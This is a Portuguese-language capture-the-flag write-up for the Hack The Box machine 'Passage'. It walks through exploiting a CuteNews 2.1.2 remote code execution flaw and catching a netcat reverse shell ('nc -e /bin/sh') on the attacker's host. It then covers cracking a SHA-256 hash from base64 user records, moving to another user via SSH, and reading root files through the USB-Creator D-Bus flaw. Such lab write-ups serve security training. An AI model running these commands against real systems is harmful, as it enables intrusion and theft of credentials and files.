---
published: true
author: EEP0x10
date: '2020-11-04'
categories:
  - SecInfo
  - Writeup
tags:
  - Writeup
  - HTB
---
![Logo](https://www.hackthebox.eu/storage/avatars/ec88bbe570fd512ab370208e5139bb41.png){: width="240" class="right"}
## Informações

|:-----------------------------|:-------------|
| Sistema Operacional          | Linux        |
| Dificuldade                  | Médio        |
| Pontos                       | 30           |
| Lançamento                   | 05/09/2020   | 
| IP                           | 10.10.10.206 |
| Criador                      | [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851) |


> Sistema Usado: Windows 10 + WSL2 Ubuntu

## Hosts
Adicionar o ip e o domínio no arquivos "hosts" 

Windows: `C:\Windows\System32\drivers\etc\hosts`

Linux: `/etc/hosts`

> É necessário **admin** / **root** para editar o arquivo

```
10.10.10.206	passage.htb
```

> **Dica**: Em windows pode-se usar o ***notepad++*** para editar esse arquivo, pois o mesmo consegue salvar / editar com permissões administrativas. Enquanto em linux, é necessário editar o arquivo com **sudo** nano /etc/hosts .


## Scan
Ferramenta usada: [Rustscan](https://github.com/RustScan/RustScan)
```terminal
$ rustscan passage.htb -- -Pn -sV
```
Resultado 1 : Varrimento de todas as portas
```terminal
Open 10.10.10.206:22
Open 10.10.10.206:80
```
Resultado 2 : Nmap nas portas abertas
```terminal
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

> O **rustscan** é usado com a função de ***varrer todas as portas de um host rapidamente***, e em seguida, **ele mesmo executa o nmap**, utilizando os parâmetros definidos após o "**--**", realizando nesse caso um Service / Version Scan (-sV) nas portas abertas.

## Enumeração

Acessar a url do laboratório na porta 80

`http://passage.htb`


![Sem título.png](/assets/img/sample/passage1.png)

Ao acessar a aplicação web, no canto inferior do site é possível verificar que a aplicação usa o CMS `Cute News`.

![Sem título2.png](/assets/img/sample/passage3.png)


CMS: `https://cutephp.com/`

A partir da descoberta do CMS, é possível pesquisar exploits referentes a ele.

```terminal
$ searchsploit cute php remote

CuteNews 0.88 - 'comments.php' Remote File Inclusion
CuteNews 0.88 - 'search.php' Remote File Inclusion
CuteNews 0.88 - 'shownews.php' Remote File Inclusion
CuteNews 1.1.1 - 'html.php' Remote Code Execution 
CuteNews 1.4.0 - Shell Injection / Remote Command Execution
CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution  
CuteNews 1.4.1 - Shell Injection / Remote Command Execution 
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
CuteNews 2.1.2 - Remote Code Execution 
CuteNews aj-fork - 'path' Remote File Inclusion
CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion
```

O Exploit que será utilizado é o CuteNews 2.1.2 - Remote Code Execution php/webapps/48800.py

`https://www.exploit-db.com/exploits/48800`

```terminal
$ searchsploit -m 48800
```

## Exploitation 

Após baixar o exploit, basta executá-lo

```terminal
$ python3 48800.py

           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://passage.htb/

================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: M9nCw3HMKX and password: M9nCw3HMKX

=======================================================
Sending Payload
=======================================================
signature_key: 3a888bb1d42e1ccdf617b140ebed5d26-M9nCw3HMKX
signature_dsi: 07be6b75ad23b596c739ed786aa021ca
logged in user: M9nCw3HMKX
============================
Dropping to a SHELL
============================

command >
```

Pegamos a shell

![Shell](https://i.redd.it/8wlaab8isi611.jpg)

## Post-Exploitation

### Shell Upgrade

Agora vamos melhorar nossa shell, pois será nossa área de trabalho daqui para frente.

Descobrir se no host se existe netcat

```terminal
command > whereis nc
nc: /bin/nc /bin/nc.traditional /usr/share/man/man1/nc.1.gz
```

Enviar a `reverse shell` para nosso netcat
> Dica: Esse site facilita o processo para fazer o reverse shell, vale apena dar uma olhada:  https://weibell.github.io/reverse-shell-generator/

1- Primeiro é preciso deixar nosso netcat escutando em uma porta no nosso `host local`
```terminal
$ rlwarp nc -nvlp YYYY
```

> YYYY é equivalente a porta escolhida para escutar

> **rlwarp** é um programa que pode ser usado junto do netcat para registrar e puxar o histórico de comandos utilizados.

2- Após isso, é preciso enviar a reverse shell do `host remoto` para nosso netcat `local`
```terminal
command > nc -e /bin/sh 10.10.XX.XX YYYY
```

> XX é equivalente a seu ip na VPN do HTB. 
Ele pode ser verificado por meio do comando para Windows: ipconfig ou para Linux: ip addr

3- Verificar se existe python3 no host remoto

```terminal
$ nc -nvlp 2123
Listening on 0.0.0.0 YYYY
Connection received on 10.10.10.206 55058
whereis python
python: /usr/bin/python3.5 /usr/bin/python3.5m /usr/bin/python2.7 /usr/bin/python /usr/lib/python3.5 /usr/lib/python2.7 /etc/python3.5 /etc/python2.7 /etc/python /usr/local/lib/python3.5 /usr/local/lib/python2.7 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz
```

4- Fazer o upgrade da shell com python3

```terminal
python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@passage:/var/www/html/CuteNews/uploads$
```

### Privilege Escalation

Agora que estamos com a shell melhorada, podemos verificar que somos o usuário `www-data` no sistema.

```terminal
$ whoami
www-data
```

#### Enumeration II
Conseguimos verificar que existem outros 2 usuários no sistema (além do root), `paul` e `nadav`.
Ambos diretórios são inacessíveis para o usuário `www-data`, portanto precisamos ganhar acesso a um deles.

```terminal
$ ls -la /home
drwxr-x--- 17 nadav nadav 4096 Dec  1 21:51 nadav
drwxr-x--- 16 paul  paul  4096 Sep  2 07:18 paul
$ cd /home/paul
bash: cd: /home/paul: Permission denied
```

#### User.txt
Podemos verificar que estamos dentro dos diretórios do CMS Cute News

```terminal
$ pwd
/var/www/html/CuteNews/uploads
```

No diretório anterior, podemos ver toda a árvore de diretórios do CMS

```terminal
$ ls -la /var/www/html/CuteNews
-rw-rw-r--  1 www-data www-data  7373 Aug 20  2018 LGPL_CKeditor.txt
-rw-rw-r--  1 www-data www-data  3119 Aug 20  2018 LICENSE.txt
-rw-rw-r--  1 www-data www-data  2523 Aug 20  2018 README.md
-rwxrwxr-x  1 www-data www-data   490 Aug 20  2018 captcha.php
drwxrwxrwx 11 www-data www-data  4096 Dec  2 04:54 cdata
-rwxrwxr-x  1 www-data www-data   941 Aug 20  2018 cn_api.php
drwxrwxr-x  9 www-data www-data  4096 Jun 18 12:49 core
drwxrwxr-x  2 www-data www-data  4096 Aug 20  2018 docs
-rwxrwxr-x  1 www-data www-data 11039 Aug 20  2018 example.php
-rwxrwxr-x  1 www-data www-data  1861 Aug 20  2018 example_fb.php
-rw-rw-r--  1 www-data www-data  1150 Aug 20  2018 favicon.ico
-rwxrwxr-x  1 www-data www-data   516 Aug 20  2018 index.php
drwxrwxr-x  9 www-data www-data  4096 Aug 20  2018 libs
drwxrwxr-x  3 www-data www-data  4096 Aug 20  2018 migrations
-rwxrwxr-x  1 www-data www-data  1189 Aug 20  2018 popup.php
-rwxrwxr-x  1 www-data www-data   357 Aug 20  2018 print.php
-rwxrwxr-x  1 www-data www-data  1593 Aug 20  2018 rss.php
-rwxrwxr-x  1 www-data www-data  8888 Aug 20  2018 search.php
-rwxrwxr-x  1 www-data www-data  1031 Aug 20  2018 show_archives.php
-rwxrwxr-x  1 www-data www-data  3370 Aug 20  2018 show_news.php
drwxrwxr-x  5 www-data www-data  4096 Aug 20  2018 skins
-rwxrwxr-x  1 www-data www-data  1275 Aug 20  2018 snippet.php
drwxrwxrwx  2 www-data www-data  4096 Dec  2 04:54 uploads
```

LIstando todos os diretórios, um que parece ser interessante é o `cdata`.

Listando o diretório cdata, podemos encontrar outro diretório interessante, `users`.

```terminal
$ ls -la /var/www/html/CuteNews/cdata
-rw-rw-rw-  1 www-data www-data  2132 Aug 20  2018 Default.tpl
-rw-rw-rw-  1 www-data www-data  1699 Aug 20  2018 Headlines.tpl
drwxrwxrwx  2 www-data www-data  4096 Aug 20  2018 archives
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 auto_archive.db.php
drwxrwxrwx  2 www-data www-data  4096 Jun 18 09:18 backup
drwxrwxrwx  2 www-data www-data  4096 Dec  1 23:49 btree
drwxrwxrwx  2 www-data www-data  4096 Aug 20  2018 cache
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 cat.num.php
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 category.db.php
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 comments.txt
-rwxr-xr-x  1 www-data www-data 32964 Jun 18 09:18 conf.php
-rwxrwxrwx  1 www-data www-data  1710 Aug 20  2018 config.php
-rwxrwxrwx  1 www-data www-data    15 Aug 20  2018 confirmations.php
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 csrf.php
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 flood.db.php
-rw-r--r--  1 www-data www-data    23 Dec  1 23:49 flood.txt
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 idnews.db.php
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 installed.mark
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 ipban.db.php
drwxrwxrwx  2 www-data www-data  4096 Jun 18 09:18 log
drwxrwxrwx  2 www-data www-data  4096 Dec  1 23:49 news
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 news.txt
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 newsid.txt
drwxrwxrwx  2 www-data www-data  4096 Jun 18 09:18 plugins
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 postponed_news.txt
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 replaces.php
-rw-rw-rw-  1 www-data www-data   564 Aug 20  2018 rss.tpl
-rwxrwxrwx  1 www-data www-data     0 Aug 20  2018 rss_config.php
drwxrwxrwx  2 www-data www-data  4096 Aug 20  2018 template
-rw-rw-rw-  1 www-data www-data     0 Aug 20  2018 unapproved_news.txt
drwxrwxrwx  2 www-data www-data  4096 Dec  2 04:54 users
-rwxrwxrwx  1 www-data www-data    58 Aug 20  2018 users.db.php
-rw-r--r--  1 www-data www-data   144 Dec  2 04:54 users.txt
```

Dentro do diretório users, podemos verificar que existem vários arquivos .php, e dois outros arquivos.
```terminal
$ ls
09.php  18.php  41.php  5a.php  6e.php  8b.php  a8.php  d6.php  users.txt
0a.php  1f.php  4e.php  5d.php  77.php  8f.php  b0.php  df.php
0c.php  21.php  50.php  61.php  79.php  95.php  c8.php  e2.php
13.php  2a.php  52.php  62.php  7a.php  96.php  cc.php  eb.php
14.php  32.php  54.php  66.php  7b.php  97.php  d4.php  fc.php
16.php  37.php  56.php  6b.php  87.php  9c.php  d5.php  lines
```

Porém, o arquivo `users.txt` está vazio, então vamos ver o arquivo `lines`

```terminal
$ cat lines
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6MTA6InBhdWwtY29sZXMiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5ODgyOTgzMztzOjY6ImVncmU1NSI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo2OiJlZ3JlNTUiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo1OiJhZG1pbiI7YTo4OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMDQ3IjtzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6MzoiYWNsIjtzOjE6IjEiO3M6NToiZW1haWwiO3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjQ6InBhc3MiO3M6NjQ6IjcxNDRhOGI1MzFjMjdhNjBiNTFkODFhZTE2YmUzYTgxY2VmNzIyZTExYjQzYTI2ZmRlMGNhOTdmOWUxNDg1ZTEiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3OTg4IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzI4MTtzOjk6InNpZC1tZWllciI7fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTc6Im5hZGF2QHBhc3NhZ2UuaHRiIjtzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6ImtpbUBleGFtcGxlLmNvbSI7czo5OiJraW0tc3dpZnQiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzIzNjtzOjEwOiJwYXVsLWNvbGVzIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJzaWQtbWVpZXIiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzI4MSI7czo0OiJuYW1lIjtzOjk6InNpZC1tZWllciI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToic2lkQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiU2lkIE1laWVyIjtzOjQ6InBhc3MiO3M6NjQ6IjRiZGQwYTBiYjQ3ZmM5ZjY2Y2JmMWE4OTgyZmQyZDM0NGQyYWVjMjgzZDFhZmFlYmI0NjUzZWMzOTU0ZGZmODgiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg1NjQ1IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIyIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzA0NztzOjU6ImFkbWluIjt9fQ==
<?php die('Direct call - access denied'); ?>
YToxOntzOjU6ImVtYWlsIjthOjE6e3M6MTU6InNpZEBleGFtcGxlLmNvbSI7czo5OiJzaWQtbWVpZXIiO319
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo5OiJraW0tc3dpZnQiO2E6OTp7czoyOiJpZCI7czoxMDoiMTU5MjQ4MzMwOSI7czo0OiJuYW1lIjtzOjk6ImtpbS1zd2lmdCI7czozOiJhY2wiO3M6MToiMyI7czo1OiJlbWFpbCI7czoxNToia2ltQGV4YW1wbGUuY29tIjtzOjQ6Im5pY2siO3M6OToiS2ltIFN3aWZ0IjtzOjQ6InBhc3MiO3M6NjQ6ImY2NjlhNmY2OTFmOThhYjA1NjIzNTZjMGNkNWQ1ZTdkY2RjMjBhMDc5NDFjODZhZGNmY2U5YWYzMDg1ZmJlY2EiO3M6MzoibHRzIjtzOjEwOiIxNTkyNDg3MDk2IjtzOjM6ImJhbiI7czoxOiIwIjtzOjM6ImNudCI7czoxOiIzIjt9fX0=
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
<?php die('Direct call - access denied'); ?>
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo2OiJlZ3JlNTUiO2E6MTE6e3M6MjoiaWQiO3M6MTA6IjE1OTg4Mjk4MzMiO3M6NDoibmFtZSI7czo2OiJlZ3JlNTUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MTU6ImVncmU1NUB0ZXN0LmNvbSI7czo0OiJuaWNrIjtzOjY6ImVncmU1NSI7czo0OiJwYXNzIjtzOjY0OiI0ZGIxZjBiZmQ2M2JlMDU4ZDRhYjA0ZjE4ZjY1MzMxYWMxMWJiNDk0YjU3OTJjNDgwZmFmN2ZiMGM0MGZhOWNjIjtzOjQ6Im1vcmUiO3M6NjA6IllUb3lPbnR6T2pRNkluTnBkR1VpTzNNNk1Eb2lJanR6T2pVNkltRmliM1YwSWp0ek9qQTZJaUk3ZlE9PSI7czozOiJsdHMiO3M6MTA6IjE1OTg4MzQwNzkiO3M6MzoiYmFuIjtzOjE6IjAiO3M6NjoiYXZhdGFyIjtzOjI2OiJhdmF0YXJfZWdyZTU1X3Nwd3ZndWp3LnBocCI7czo2OiJlLWhpZGUiO3M6MDoiIjt9fX0=
<?php die('Direct call - access denied'); ?>
YToxOntzOjI6ImlkIjthOjE6e2k6MTU5MjQ4MzMwOTtzOjk6ImtpbS1zd2lmdCI7fX0=
```

Esse arquivo contém diversas informações em base64. Então vamos verificar.
> Dica: Para quebrar um base64 é possível fazer pela linha de comando ou por sites externos, como o:  https://www.base64decode.org/

Quebrando eles, podemos verificar que um deles ém interessante, pois se trata do usuário `paul`

```terminal
$ cat hash
YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19
$ base64 -d hash
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}
```

É possível identificar um hash dentro dentro dele, referenciando a senha do usuário.

```
"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";
```

Podemos ver que é provavelmente um hash `SHA-256`.

> Dica: Para descobrir o tipo de um hash, é possível fazer pela linha de comando com o hashid ou por um site externo, como: https://www.tunnelsup.com/hash-analyzer/

```
$ hashid -m -j e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
Analyzing 'e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd'
[+] Snefru-256 [JtR Format: snefru-256]
[+] SHA-256 [Hashcat Mode: 1400][JtR Format: raw-sha256]
[+] RIPEMD-256
[+] Haval-256 [JtR Format: haval-256-3]
[+] GOST R 34.11-94 [Hashcat Mode: 6900][JtR Format: gost]
[+] GOST CryptoPro S-Box
[+] SHA3-256 [Hashcat Mode: 5000][JtR Format: raw-keccak-256]
[+] Skein-256 [JtR Format: skein-256]
[+] Skein-512(256)
```
Agora basta quebrar o hash.
> Dica: Vale apena sempre tentar quebrar o hash primeiramente em sites externos (como: https://crackstation.net/), pois o resultado será muito mais veloz do que via hashcat ou john usando uma wordlist. Porém, caso não tenha sucesso em um site externo, provavelmente será necessário usar o hashcat ou john e criar uma wordlist personalizada para quebrar o hash em questão.

Quebrando o hash, é possível obter a senha do usuário `Paul`:`atlanta1`

Agora basta logar com o usuário `Paul` e pegar a flag de user.

```terminal
$ su paul
Password: atlanta1
paul@passage:~$
$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
$ cd /home/paul
$ cat user.txt
~flag user~
```

#### Root.txt

Agora precisamos escalar o privilégio para o usuário `nadav`.

Dentro do diretório do paul, é possível perceber a pasta `.ssh`.

```terminal
$ ls -la
total 112
drwxr-x--- 16 paul paul 4096 Sep  2 07:18 .
drwxr-xr-x  4 root root 4096 Jul 21 10:43 ..
----------  1 paul paul    0 Jul 21 10:44 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3770 Jul 21 10:44 .bashrc
drwx------ 10 paul paul 4096 Sep  1 02:10 .cache
drwx------ 14 paul paul 4096 Aug 24 07:12 .config
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Desktop
-rw-r--r--  1 paul paul   25 Aug 24 07:11 .dmrc
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Downloads
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
drwx------  2 paul paul 4096 Aug 24 07:13 .gconf
drwx------  3 paul paul 4096 Sep  2 07:19 .gnupg
-rw-------  1 paul paul 1292 Sep  2 07:18 .ICEauthority
drwx------  3 paul paul 4096 Aug 24 07:11 .local
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Music
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Public
drwxr-xr-x  2 paul paul 4096 Jul 21 10:43 .ssh
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Templates
-r--------  1 paul paul   33 Dec  1 21:52 user.txt
drwxr-xr-x  2 paul paul 4096 Jul 21 10:44 Videos
-rw-------  1 paul paul   52 Sep  2 07:18 .Xauthority
-rw-------  1 paul paul 1228 Sep  2 07:19 .xsession-errors
-rw-------  1 paul paul 1397 Sep  1 04:20 .xsession-errors.ol
```

Dentro do diretório .ssh, existe a chave pública do usuário `nadav`, portanto basta apenas conectarmos no usuário via ssh.

```terminal
$ ls -la
-rw-r--r--  1 paul paul  395 Jul 21 10:43 authorized_keys
-rw-------  1 paul paul 1679 Jul 21 10:43 id_rsa
-rw-r--r--  1 paul paul  395 Jul 21 10:43 id_rsa.pub
-rw-r--r--  1 paul paul 1534 Dec  2 06:28 known_hosts
```

```terminal
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
$ ssh nadav@127.0.0.1
Last login: Wed Dec  2 06:30:24 2020 from 127.0.0.1
nadav@passage:~$
$ id
uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

Agora que somos o usuário `nadav`, precisamos escalar o privilégio para pegar o usuário `root`.

Enumerando a máquina, podemos ver um processo interessante sendo executado.
> Dica: Para enumerar a máquina, e tentar descobrir possíveis brechas, pode-se utilizar scripts como [lienum](https://github.com/rebootuser/LinEnum) ou [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), que precisam ser transferidos e executados na máquina alvo.

```terminal
$ ps aux
. . .
root       4894  0.0  0.4 235520 19840 ?        Sl   04:16   0:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
. . .
```

A técnica que será utilizada, tem como falha o USB-Creator D-Bus.
> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

Essa falha permite que um usuário com acesso ao grupo `sudoers` ignore a política de segurança de senha do `sudo`, permitindo o usuário sobrescrever arquivos como root, sem precisar informar a senha.

Portanto, podemos ler o arquivo root.txt, mandando seu conteúdo para um arquivo vazio na pasta /tmp.

$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
<all --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCrea<untu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.US<ath /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.< --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag true
()
$ cat /tmp/flag
~flag root~
## Conclusão





